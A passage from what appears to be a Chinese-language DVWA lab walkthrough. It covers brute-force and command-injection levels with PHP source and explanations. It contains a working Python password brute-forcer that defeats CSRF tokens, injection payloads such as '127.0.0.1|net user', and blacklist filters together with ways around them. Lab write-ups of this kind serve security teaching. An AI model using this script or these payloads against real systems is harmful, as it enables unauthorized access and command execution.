class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requrl = <span class="string">&#x27;http://172.16.34.167/dvwa/vulnerabilities/brute/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>(<span class="params">requrl, header</span>):</span></span><br><span class="line">    resp = requests.get(requrl, headers=header)</span><br><span class="line">    print(resp.status_code, <span class="built_in">len</span>(resp.content))</span><br><span class="line">    soup = BeautifulSoup(resp.content, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="built_in">input</span> = soup.select(<span class="string">&#x27;input[type=hidden]&#x27;</span>)</span><br><span class="line">    user_token = <span class="built_in">input</span>[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_token = get_token(requrl, header)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file=<span class="string">&#x27;/Users/optimus/tools/dict/passwords_quick.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        requrl = <span class="string">&#x27;http://172.16.34.167/dvwa/vulnerabilities/brute/?username=admin&amp;password=&#x27;</span> + \</span><br><span class="line">            line + <span class="string">&#x27;&amp;Login=Login&amp;user_token=&#x27;</span> + user_token</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(i, <span class="string">&#x27;admin&#x27;</span>, line.strip(), end=<span class="string">&#x27;  &#x27;</span>)</span><br><span class="line">        user_token = get_token(requrl, header)</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="built_in">len</span>(f.readlines())):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200214220117.png" style="zoom:50%;"><p>通过返回长度，可以判断<code>账号/密码</code>:<code>admin/password</code>。</p><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = mysql_real_escape_string( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = mysql_real_escape_string( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    <span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        <span class="variable">$last_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span> = strtotime( <span class="variable">$last_login</span> );</span><br><span class="line">        <span class="variable">$timeout</span>    = strtotime( <span class="string">&quot;<span class="subst">&#123;$last_login&#125;</span> +<span class="subst">&#123;$lockout_time&#125;</span> minutes&quot;</span> );</span><br><span class="line">        <span class="variable">$timenow</span>    = strtotime( <span class="string">&quot;now&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$timenow</span> &gt; <span class="variable">$timeout</span> )</span><br><span class="line">            <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR);</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        <span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，<code>Impossible</code>在<code>high</code>的基础上，增加了登录失败次数的检测，登录失败次数超了3次，将会将账号锁定15秒。而且使用了PDO（PHP Data Object）机制来抵御SQL注入，PDO扩展已经封装了SQL的语句，没有办法打破SQL语句的结构来执行想要的结果，一次也避免了SQL注入。</p><h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><h2 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h2><p>这里我们要熟悉两种符号：</p><table><thead><tr><th>符号</th><th>含义</th><th>例子</th></tr></thead><tbody><tr><td>｜</td><td>管道，将前面的输出作为后面的输入。</td><td>ls | more</td></tr><tr><td>&amp;</td><td>前面一个执行完，执行后面的</td><td>ls &amp; cd ..</td></tr><tr><td>&amp;&amp;</td><td>当前面的执行成功后才执行后面的，否则不再执行</td><td>touch 1.txt &amp;&amp; cat 1.txt</td></tr><tr><td>;</td><td>无论前一个执行完没有，后面的接着执行</td><td>ls ; cd ..</td></tr></tbody></table><p>在这里，我们直接通过<code>&amp;</code>可以实现命令行注入。</p><p><code>127.0.0.1 &amp; dir</code></p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200213161939.png" style="zoom: 33%;"><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析源码，我们可以看到，将输入的<code>&amp;&amp;</code>和<code>;</code>都过滤掉了，因此无法用这两种符号来进行命令行注入。</p><p>但是我们还可以利用<code>&amp;</code>来进行注入。</p><p>输入：<code>127.0.0.1&amp;dir</code></p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200215102545.png" style="zoom: 33%;"><p>还有一种绕过方法是：<code>127.0.0.1&amp;;&amp;net user</code>。</p><p>因为会将<code>;</code>替换为空，因此输入变为了<code>127.0.0.1&amp;&amp;net user</code>。</p><h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到，这里过滤的符号更多。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br></pre></td></tr></table></figure><p>这里进一步完善了黑名单，但是仔细观察可以发现，第三个<code>| </code>是在竖线后面多了一个空格，所以我们依然可以绕过。</p><p><code>127.0.0.1|net user</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200215112730.png"></p><h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析源码：</p><p><code>stripslashes()</code>:删除反斜杠<code>\</code>。</p><p><code>explode()</code>:将字符串打散成列表。</p><p>可以发现添加了<code>Anti-CSRF token</code>，每次都会随机一个token和服务端check。</p><p>并且将输入的字符串通过<code>.</code>打散，然后判断列表的每一个元素是否为数字，若都为数字再组合成ip地址的形式。</p><p>因此不存在命令行注入。</p><h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h1><h2 id="low-4"><a href="#low-4" class="headerlink" 